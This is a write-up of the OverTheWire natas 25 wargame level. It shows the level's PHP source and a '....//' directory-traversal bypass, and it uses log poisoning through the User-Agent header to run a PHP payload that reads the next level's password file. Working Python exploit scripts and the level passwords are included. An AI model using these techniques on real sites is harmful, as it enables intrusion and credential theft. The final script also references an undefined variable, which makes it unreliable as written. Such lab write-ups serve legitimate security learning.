---
title: natas 25 walkthrough
description: over the wire natas 25
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-25 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 25 walkthrough
    order: 30
---
## Description
> Username: natas25
> 
> URL:      http://natas25.natas.labs.overthewire.org

### Source Code
```php
<?php
// cheers and <3 to malvina
// - morla

function setLanguage()
{
    /* language setup */
    if (array_key_exists("lang", $_REQUEST))
        if (safeinclude("language/" . $_REQUEST["lang"]))
            return 1;
    safeinclude("language/en");
}

function safeinclude($filename)
{
    // check for directory traversal
    if (strstr($filename, "../")) {
        logRequest("Directory traversal attempt! fixing request.");
        $filename = str_replace("../", "", $filename);
    }
    // dont let ppl steal our passwords
    if (strstr($filename, "natas_webpass")) {
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) {
        include($filename);
        return 1;
    }
    return 0;
}

function listFiles($path)
{
    $listoffiles = array();
    if ($handle = opendir($path))
        while (false !== ($file = readdir($handle)))
            if ($file != "." && $file != "..")
                $listoffiles[] = $file;

    closedir($handle);
    return $listoffiles;
}

function logRequest($message)
{
    $log = "[" . date("d.m.Y H::i:s", time()) . "]";
    $log = $log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log = $log . " \"" . $message . "\"\n";
    $fd = fopen("/var/www/natas/natas25/logs/natas25_" . session_id() . ".log", "a");
    fwrite($fd, $log);
    fclose($fd);
}
?>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
<?php
session_start();
setLanguage();

echo "<h2>$__GREETING</h2>";
echo "<p align=\"justify\">$__MSG";
echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

---
## Progress
### Observation
User can control the value of `$_SERVER['HTTP_USER_AGENT']` and `$_REQUEST`.
http://natas25.natas.labs.overthewire.org/language/en properly prints the php code.
When accessing http://natas25.natas.labs.overthewire.org/logs/natas25_tpigqjsqu34iqeg3rcavtq3d2h.log, I got an internal server error. Accessing http://natas25.natas.labs.overthewire.org/natas/logs/natas25_refg9pem9ia3qh86tf2gd2gu2h.log gave us 404.
The `include` function will print all the content in the included file, and treating the content in php code block as a part of code.
### Plan
Since the service did not fully block the relative file input. It just makes `../` be empty. Therefore, we can construct `....//` to make the processed string be `../`. One cannot construct a string containing `natas_passwd`, since the service will terminate. 
Use `$_SERVER['HTTP_USER_AGENT']` to access the `natas_passwd`, and use `$_REQUEST` to access the log file.
### Gathering Info
#### Structure of Directory
Guess the language directory is under `/var/www/natas/natas25/natas25`. 
Query `http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_refg9pem9ia3qh86tf2gd2gu2h.log` give us

> [13.02.2024 04::04:40] Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 "Directory traversal attempt! fixing request."

Great! It seems the plan would work.
### Pwn
#### First Try
```python
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

username = "natas25"
password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
authentication = HTTPBasicAuth(username, password)

def get_content(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    return content.__str__()

def main():
    main_url = "http://natas25.natas.labs.overthewire.org/"
    with open("./natas_pwn.php", "r") as f:
        header = {
            "User-Agent": f.read(),
        }
    response = requests.get(main_url, auth=authentication, headers=header)
    session_id = response.cookies["PHPSESSID"]
    log_file_path = "?lang=....//logs/natas25_" + session_id + ".log"
    response = requests.get(main_url+log_file_path, auth=authentication, cookies=response.cookies)
    print(get_content(response))

main()
```
Get 
> [13.02.2024 04::16:02] python-requests/2.31.0 "Directory traversal attempt! fixing request."

User agent injection failed.
Try to send the second request with the same header. Succeeded! 
#### Final
script
```python
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

username = "natas25"
password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
authentication = HTTPBasicAuth(username, password)

def get_content(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    return content.__str__()

def main():
    main_url = "http://natas25.natas.labs.overthewire.org/"
    with open("./natas_pwn.php", "r") as f:
        header = {
            "User-Agent": f.read(),
        }
    req = requests.get(main_url, auth=authentication, headers=header)
    session_id = response.cookies["PHPSESSID"]
    log_file_path = "?lang=....//logs/natas25_" + session_id + ".log"
    response = requests.get(main_url+log_file_path, auth=authentication, cookies=response.cookies, headers=header)
    print(get_content(response))

main()
```
payload (`natas_pwn.php`)
```php
<?php echo fread(fopen("/etc/natas_webpass/natas26", "r"),filesize("/etc/natas_webpass/natas26")); ?>
```
8A506rfIAXbKKk68yJeuTuRq4UfcK70k

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 

### Tools
- 